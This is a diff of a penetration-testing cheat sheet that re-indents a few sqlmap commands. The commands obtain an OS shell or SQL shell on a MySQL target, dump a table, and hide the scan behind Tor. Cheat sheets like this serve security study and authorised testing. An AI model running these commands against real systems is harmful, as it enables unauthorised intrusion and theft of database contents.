@@ -1875,19 +1875,19 @@ Client, Web and Password Attacks
                      
               - Get OS shell  
               
-                 `sqlmap --dbms=mysql -u "$URL" --os-shell`
+                  `sqlmap --dbms=mysql -u "$URL" --os-shell`
                        
                - Get SQL shell  
                        
-                  `sqlmap --dbms=mysql -u "$URL" --sql-shell`
+                 `sqlmap --dbms=mysql -u "$URL" --sql-shell`
                         
                 - SQL query  
                 
-                   `sqlmap --dbms=mysql -u "$URL" -D "$DATABASE" --sql-query "SELECT * FROM $TABLE;"` 
+                  `sqlmap --dbms=mysql -u "$URL" -D "$DATABASE" --sql-query "SELECT * FROM $TABLE;"` 
                          
                  - Use Tor Socks5 proxy  
                  
-                    `sqlmap --tor --tor-type=SOCKS5 --check-tor --dbms=mysql -u "$URL" --dbs`
+                  `sqlmap --tor --tor-type=SOCKS5 --check-tor --dbms=mysql -u "$URL" --dbs`
 
 -   Password Attacks
     --------------------------------------------------------------------------------------------------------------
